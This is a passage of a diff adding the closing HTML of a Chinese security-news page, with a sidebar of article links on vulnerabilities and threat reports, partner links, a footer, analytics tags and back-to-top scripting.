+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
